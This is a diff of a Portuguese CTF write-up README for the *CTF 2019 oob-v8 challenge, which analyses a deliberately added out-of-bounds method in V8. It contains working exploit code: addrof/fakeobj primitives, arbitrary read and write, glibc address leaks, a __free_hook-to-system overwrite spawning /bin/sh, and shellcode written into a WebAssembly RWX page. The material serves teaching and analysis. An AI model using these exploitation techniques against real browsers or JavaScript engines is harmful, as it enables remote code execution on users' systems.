@@ -1,21 +1,21 @@
-## Análise da solução
+## OOB-V8 (*CTF 2019): análise do grupo
+
+Este README reúne o desafio, os trechos de código relevantes e nossa análise da falha. Seguimos a cadeia **índice incorreto → interpretação do armazenamento → alteração do `Map` → primitivas de leitura e escrita → desvio do fluxo de execução**. O [writeup de referência](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) documenta a exploração original; aqui organizamos o raciocínio e acrescentamos um modelo próprio para separar comprimento lógico de capacidade física.
 
 ### Informações gerais
 
 + Artefato: V8
 + Versão: v7.5.0
 + Data: 5 de abril de 2019
-+ Descrição: vulnerabilidade de acesso fora dos limites introduzida manualmente
++ Descrição: método vulnerável introduzido manualmente no V8
 + CTF: *CTF 2019
 + Nome do desafio: oob-v8
 
-Referência: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
+O diretório `build/` contém o patch e a receita de compilação; `challenge/` contém o binário e os arquivos auxiliares; `solution/` reúne o código e as figuras da exploração; `contribuicao/` contém nosso modelo e seus testes. Para reconstruir o binário, execute `bash build/build.sh` na raiz do repositório. O script usa Docker e grava o resultado em `challenge/`. O pacote e os binários originais também estão em `attachment/` e `challenge/`.
 
-Para reconstruir o binário do desafio, execute `bash build/build.sh` a partir desta pasta. O script usa Docker e grava os arquivos gerados em `challenge/`. Os binários originais e o pacote do desafio também estão incluídos.
+### 1. O índice usado pelo método vulnerável
 
-### Vulnerabilidade
-
-O desafio introduziu manualmente uma vulnerabilidade que permite escrever uma posição além do fim de um array.
+O patch em [`build/oob.diff`](./build/oob.diff) registra o método `oob` em `Array.prototype`. O trecho decisivo está abaixo. Conforme o ramo escolhido, ele lê ou escreve em `elements[length]`, usando o comprimento do array como índice. Para os elementos visíveis de um array de comprimento `L`, os índices válidos terminam em `L - 1`.
 
 ```
 +BUILTIN(ArrayOob){
@@ -41,11 +41,11 @@ O desafio introduziu manualmente uma vulnerabilidade que permite escrever uma po
 +}
 ```
 
-### Contribuição própria: modelo de comprimento e capacidade
+### 2. Nossa contribuição: distinguir comprimento de capacidade
 
-O código do desafio usa `length` como índice em `elements.get_scalar(length)` e `elements.set(length, ...)`. Minha contribuição é o [modelo de capacidade](./contribuicao/modelo_capacidade.js), que separa duas condições frequentemente tratadas como se fossem a mesma: o acesso fora do comprimento lógico do array e o acesso fora da capacidade do armazenamento `FixedDoubleArray`.
+Nós fizemos o [modelo de capacidade](./contribuicao/modelo_capacidade.js) e os [testes de fronteira](./contribuicao/modelo_capacidade.test.js) para esclarecer uma condição que muda o efeito da falha. O índice `length` viola sempre o comprimento lógico do array, mas não ultrapassa necessariamente a capacidade do `FixedDoubleArray`. Essa distinção ajuda a avaliar quando o acesso pode alcançar outro objeto na memória.
 
-Para um comprimento `L` e uma capacidade `C`, com `C >= L`, o índice usado é `i = L`. Portanto, `i >= L` é sempre verdadeiro. Se `C = L`, então `i >= C` e o acesso cruza o limite físico do armazenamento. Se `C > L`, o mesmo índice ainda cabe na capacidade excedente, embora esteja fora do comprimento lógico. A tabela produzida pelo programa torna essa diferença visível:
+Chamamos o comprimento de `L`, a capacidade de `C` e o índice acessado de `i`. No patch, `i = L`. Assim, `i >= L` é sempre verdadeiro. Quando `C = L`, também temos `i >= C`: o acesso ultrapassa o armazenamento. Quando `C > L`, o índice está na capacidade excedente. Nossa tabela compara essas situações sem presumir um layout específico da heap:
 
 ```text
 Comprimento | Capacidade | Índice acessado | Resultado
@@ -53,11 +53,11 @@ Comprimento | Capacidade | Índice acessado | Resultado
 3           | 8          | 3              | dentro da capacidade excedente
 ```
 
-Execute `node contribuicao/modelo_capacidade.js` para reproduzir a tabela e `node --test contribuicao/modelo_capacidade.test.js` para verificar os casos de fronteira. O modelo é didático: ele classifica índices e não executa o V8 nem afirma qual capacidade ou posição de objetos uma execução real terá. Para confirmar a adjacência ao campo `Map`, é preciso inspecionar a memória do binário do desafio, como na seção seguinte.
+Podemos reproduzir o resultado com `node contribuicao/modelo_capacidade.js` e verificar os casos de fronteira com `node --test contribuicao/modelo_capacidade.test.js`. O programa classifica índices; não executa o V8. Para concluir que a escrita alcança o `Map`, precisamos observar a capacidade e a vizinhança dos objetos no binário do desafio.
 
-### Disposição da memória
+### 3. Do limite do array ao campo `Map`
 
-Ao executar um programa JavaScript simples e inspecionar a memória, observamos que o objeto `JSArray` fica logo após os elementos do array. A escrita fora dos limites permite sobrescrever o campo `Map` desse objeto.
+O exemplo a seguir permite inspecionar um array de números com `%DebugPrint` no `d8`. Nas figuras do desafio, o armazenamento dos elementos aparece imediatamente antes do objeto `JSArray`. Sob essa disposição e com capacidade igual ao comprimento, o acesso no índice `length` pode alcançar o campo `Map` do objeto seguinte. Essa adjacência é uma observação do exemplo, não uma propriedade garantida para qualquer array.
 
 ```
 let a = [1.1, 2.2, 3.3];
@@ -69,17 +69,17 @@ Math.cosh(1);
 ![Disposição do array e da página WebAssembly](./solution/assets/double-array-2.jpg)
 
 
-### Confusão de tipos
+### 4. A mesma sequência de bits, dois tipos
 
-Sobrescrever o campo `Map` de um `JSArray` pode causar confusão de tipos no V8. Esse campo determina o tipo dos elementos e a forma de acessá-los:
+O `Map` descreve a estrutura do objeto e orienta como o V8 interpreta seus elementos. Quando substituímos o `Map` de um array pelo de outro tipo de array, o motor passa a interpretar os mesmos bits segundo outra representação:
 
-1. Array de objetos: ao acessar um elemento, por exemplo no índice 0, o V8 interpreta seu valor como um ponteiro para um objeto e busca o objeto referenciado.
+1. Num array de objetos, o valor de um elemento é tratado como referência a um objeto.
 
-2. Array de números de ponto flutuante: o acesso retorna diretamente o número armazenado naquele índice.
+2. Num array de números de ponto flutuante, os bits são lidos como um número `double`.
 
-A confusão de tipos permite obter o endereço de um `JSObject` ao fazer o V8 interpretar seu ponteiro como um valor numérico. No sentido inverso, um valor numérico que representa um endereço pode ser interpretado como ponteiro, permitindo escrever nos dados apontados.
+A troca cria dois caminhos complementares. Podemos ler uma referência como número para descobrir um endereço; também podemos apresentar os bits de um endereço como número e fazer o V8 tratá-los como referência. As funções a seguir materializam esses caminhos.
 
-Para revelar o endereço de um objeto, substituímos o `Map` de um array de objetos pelo `Map` de um array de números de ponto flutuante. O ponteiro do elemento passa a ser lido como número.
+No primeiro exemplo, `obj_arr` guarda um objeto. Ao receber temporariamente o `Map` de `fl_arr`, o acesso a `obj_arr[0]` expõe os bits da referência como um número. Depois restauramos o `Map` original.
 
 ```
 var temp_obj = {"A":1};
@@ -94,7 +94,7 @@ console.log("[+] endereço de temp_obj: 0x" + ftoi(addr).toString(16));
 // [+] endereço de temp_obj: 0x2c4b4c4eab1
 ```
 
-No sentido contrário, podemos fazer o V8 tratar um número de ponto flutuante como referência a um objeto.
+No segundo exemplo, invertemos os mapas: os bits guardados em `fl_arr[0]` passam a ser interpretados como referência.
 
 ```
 fl_arr.oob(map1);
@@ -102,7 +102,7 @@ let fakeobj = fl_arr[0]; // treat 1.1 in hex format as an address of object
 console.log("[+] fakeobj: 0x" + ftoi(fakeobj).toString(16));
 ```
 
-Assim, obtemos duas primitivas básicas: `addrof` e `fakeobj`.
+Reunimos os dois movimentos nas primitivas `addrof` e `fakeobj`:
 
 ```
 var temp_obj = {"A":1};
@@ -128,7 +128,7 @@ function fakeobj(addr) {
 }
 ```
 
-Estas são as funções auxiliares:
+Para preservar os bits nas conversões entre `double` e inteiro, usamos as duas visões do mesmo `ArrayBuffer`:
 
 ```
 /// Funções auxiliares para converter entre números de ponto flutuante e inteiros
@@ -148,15 +148,16 @@ function itof(val) { // typeof(val) = BigInt
 }
 ```
 
-### Primitivas de leitura e escrita arbitrárias
+### 5. Transformar a confusão de tipos em acesso à memória
 
-#### Primitiva de leitura arbitrária
-Para ler um endereço arbitrário com `addrof` e `fakeobj`, manipulamos um array de números de ponto flutuante e criamos um objeto falso:
+#### Leitura arbitrária
 
-1. Criar um array de quatro números de ponto flutuante. Nesta disposição de memória, o armazenamento dos elementos fica 0x30 bytes antes do objeto do array.
-2. Criar um objeto falso nos elementos, com o tipo de um array de números de ponto flutuante.
-3. Colocar o endereço de destino em `element[2]`. Essa posição será interpretada como o campo `elements` do objeto falso.
-4. Acessar o índice 0 do objeto falso. O V8 tentará ler o valor em `endereço de destino + 0x10`.
+Depois de obter endereços e referências falsas, precisamos controlar o ponteiro `elements` que uma leitura usa. O exemplo do desafio constrói um array de quatro números e sobrepõe a ele a interpretação de um objeto falso. O raciocínio é:
+
+1. No layout observado, o armazenamento dos quatro elementos fica 0x30 bytes antes do objeto do array.
+2. O primeiro elemento recebe os bits do `Map` de um array de números; eles servirão como `Map` do objeto falso.
+3. O endereço de destino fica em `element[2]`, posição reinterpretada como o ponteiro `elements` desse objeto falso.
+4. A leitura de `fakeArray[0]` alcança o endereço apontado pelo campo `elements`, considerando o deslocamento de 0x10 mostrado no exemplo.
 
 ![Esquema da primitiva de leitura arbitrária](./solution/assets/arbitrary-read-primitive.jpg)
 
@@ -194,7 +195,7 @@ let fakeArray = fakeobj(addrof(floatArray)-0x20n);
 console.log("[+] valor revelado: 0x" + ftoi(fakeArray[0]).toString(16)); // Lemos o valor em target_string_addr + 0x10
 ```
 
-Código da primitiva:
+O código abaixo encapsula a preparação do objeto falso, o ajuste do endereço e a leitura. A correção do deslocamento depende do layout observado nesse binário.
 
 ```
 // Usamos este array para ler e escrever em endereços arbitrários
@@ -219,9 +220,9 @@ function arb_read(addr) {
 ```
 
 
-#### Primitiva de escrita arbitrária
+#### Escrita arbitrária
 
-Segundo o [artigo de referência](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/), reutilizar a primitiva de leitura para escrever em `fakeobj[0]` falha em alguns endereços, como o de `__free_hook`. No exemplo acima, porém, a escrita no conteúdo de uma string do ambiente JavaScript funciona.
+Uma escrita em `fakeArray[0]` reutiliza a mesma ideia, mas não serve de forma uniforme para todos os endereços. O [writeup original](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) registra falha ao tentar atingir certos alvos, incluindo `__free_hook`. O exemplo abaixo mostra um alvo diferente: o conteúdo de uma string do ambiente JavaScript.
 
 ```
 let target_string = "AAAAAAAA";
@@ -252,7 +253,7 @@ root@48d3ec3e0728:/build/v8/v8# ./out.gn/x64.release/d8 --allow-natives-syntax /
 [+] conteúdo revelado de target_string: DBBBBBB // a conversão BigInt -> Float -> byte perde precisão
 ```
 
-Isso fornece uma primeira versão da escrita arbitrária, que podemos aprimorar.
+A função seguinte resume essa primeira forma de escrita. Ela ainda passa por uma conversão para `double`, o que limita a precisão dos bits gravados.
 
 ```
 function initial_arb_write(addr, val) {
@@ -267,11 +268,11 @@ function initial_arb_write(addr, val) {
 }
 ```
 
-**Uma versão mais robusta**
+**Escrita de bytes com `DataView`**
 
-Para escrever com mais precisão, usamos `ArrayBuffer` e `DataView`. O primeiro armazena bytes; o segundo permite interpretá-los e gravá-los em formatos específicos.
+Para controlar os bytes gravados, o exemplo usa `ArrayBuffer` como armazenamento e `DataView` como interface de escrita em 64 bits. Isso evita depender do valor numérico representado pelo `double` no momento da gravação final.
 
-Em vez de escrever por meio de um array de números de ponto flutuante, alteramos o ponteiro `backing_store` de um `ArrayBuffer`, análogo ao campo `elements` do array.
+O passo decisivo é redirecionar o campo `backing_store` do `ArrayBuffer` para o endereço de destino. Depois, `setBigUint64` escreve por essa visão do armazenamento. O deslocamento de 0x20 até `backing_store` é específico da estrutura usada no desafio.
 
 ![Esquema da primitiva de escrita arbitrária](./solution/assets/arbitrary-write-primitive.jpg)
 
@@ -286,11 +287,11 @@ function arb_write(addr, val) {
 }
 ```
 
-### Desvio do fluxo de execução: substituir `__free_hook` por `system`
+### 6. Primeira rota histórica: `__free_hook` e `system`
 
-Com as primitivas prontas, precisamos descobrir o endereço base da glibc, pois os símbolos `__free_hook` e `system` têm deslocamentos conhecidos em relação a ele. Os objetos JavaScript ficam na memória gerenciada pelo V8, separada da memória gerenciada por `ptmalloc`. Por isso, procuramos, na memória do V8, ponteiros para outras regiões, como a heap do processo, o segmento de código e a glibc.
+O writeup apresenta duas formas de usar as primitivas para alterar o fluxo de execução. Na primeira, o objetivo é gravar o endereço de `system` em `__free_hook`. Para calcular ambos os endereços, precisamos antes encontrar a base da glibc. Como os objetos JavaScript e as estruturas de `ptmalloc` ocupam regiões diferentes, a análise percorre ponteiros encontrados na memória até alcançar referências à heap do processo, ao executável e à glibc.
 
-#### Descobrir o endereço da heap
+#### Da heap do V8 para a heap do processo
 ```
 (gdb) search-pattern 0x000055d8 little 0x0000101634300000-0x0000101634340000
 [+] Buscando '\xd8\x55\x00\x00' in 0x0000101634300000-0x0000101634340000
@@ -316,9 +317,9 @@ root@48d3ec3e0728:/build/v8/v8# ./out.gn/x64.release/d8 --allow-natives-syntax /
 [+] endereço base da heap: 0x555809d2c000
 ```
 
-#### Descobrir o endereço do segmento de código
+#### Da heap do processo para o executável
 
-Da mesma forma, procuramos na heap um ponteiro para a glibc ou para o segmento de código.
+O próximo endereço do exemplo é lido na heap do processo. Subtrair o deslocamento conhecido do ponteiro observado fornece a base do executável PIE. Esse deslocamento não é uma constante geral do V8.
 
 ```
 (gdb) search-pattern 0x0000558485 little 0x0000558487367000-0x0000558487415000
@@ -336,9 +337,9 @@ let pie_base_addr = text_seg_ptr - 0xBE9B5n;
 console.log("[+] ponteiro revelado para PIE: 0x" + pie_base_addr.toString(16));
 ```
 
-#### Descobrir o endereço da glibc
+#### Da tabela `.got` para a glibc
 
-Depois de descobrir a base do executável PIE, lemos a entrada de `puts` na tabela `.got`, que aponta para a função na glibc.
+Com a base do PIE, localizamos a entrada de `puts` na `.got`. Seu conteúdo é um ponteiro para a função na glibc; subtraímos o deslocamento de `puts` para obter a base da biblioteca usada nesse ambiente.
 
 ```
 (gdb) got puts
@@ -353,9 +354,9 @@ let libc_base_addr = puts_addr - 0x80970n;
 console.log("[+] ponteiro revelado para a libc: 0x" + libc_base_addr.toString(16));
 ```
 
-#### Substituir `__free_hook` por `system`
+#### Redirecionar o gancho de liberação
 
-Em seguida, calculamos os deslocamentos de `__free_hook` e `system` dentro da glibc.
+Conhecida a base, somamos os deslocamentos dos símbolos `__free_hook` e `system` e usamos a primitiva de escrita. Os números abaixo pertencem à versão da glibc do desafio; não devem ser reaproveitados sem conferência em outro ambiente.
 ```
 (gdb) p &__free_hook
 $1 = (void (**)(void *, const void *)) 0x7f55961f08e8 <__free_hook>
@@ -375,14 +376,14 @@ arb_write(free_hook_addr, system_addr);
 $1 = (void (*)(void *, const void *)) 0x7fc5e6103420 <__libc_system>
 ```
 
-Por fim, a linha abaixo aciona `system('/bin/sh')` quando a string `/bin/sh` é liberada.
+No encadeamento descrito pelo writeup, a liberação da string `/bin/sh` aciona o gancho já alterado:
 ```
 console.log("/bin/sh");
 ```
 
-### Desvio do fluxo de execução: criar uma página RWX com WebAssembly
+### 7. Segunda rota histórica: página RWX de WebAssembly
 
-Nas versões antigas do V8, o código WebAssembly podia ocupar uma página com permissões de leitura, escrita e execução (RWX). O `wasm_code` abaixo contém uma função `main` que retorna 42. Ao instanciá-la, o V8 cria a página RWX; ao chamá-la, passa por uma tabela de saltos nessa página para alcançar `main`.
+A outra rota usa o comportamento de versões antigas do V8 ao compilar WebAssembly. O módulo abaixo exporta uma função `main` que retorna 42. No ambiente do desafio, a instância permite localizar uma página RWX ligada ao código compilado. O fluxo passa por essa página antes de chegar à função; por isso, a escrita de bytes nela pode alterar o destino executado.
 
 ![Disposição do array e da página WebAssembly](./solution/assets/double-array-2.jpg)
 
@@ -401,7 +402,7 @@ console.log("[+] endereço da página RWX do Wasm: 0x" + rwx_page_addr.toString(
 [+] endereço da página RWX do Wasm: 0x7b54b655000
 ```
 
-Basta então gravar o shellcode no início da página RWX e chamar `main`.
+O trecho final do exemplo grava os bytes do shellcode na página localizada e chama `main`. Assim como os deslocamentos da rota anterior, o endereço do campo usado para encontrar essa página depende da versão e do binário.
 
 ```
 function copy_shellcode(addr, shellcode) {
@@ -426,3 +427,7 @@ var shellcode = [
 copy_shellcode(rwx_page_addr, shellcode);
 f();
 ```
+
+### 8. O que a análise demonstra
+
+O patch usa o comprimento como índice de acesso, e nosso modelo mostra por que isso basta para violar o limite lógico do array. As figuras e os exemplos do desafio ilustram uma disposição de memória na qual esse acesso também alcança o `Map` de um `JSArray`. A partir daí, a troca de mapas explica as primitivas `addrof` e `fakeobj`; o redirecionamento de `elements` e `backing_store` explica as leituras e escritas posteriores. As duas rotas finais dependem de características históricas do V8 e da glibc presentes no ambiente do desafio. Nós mantivemos essas dependências explícitas para não generalizar os endereços e deslocamentos do exemplo.
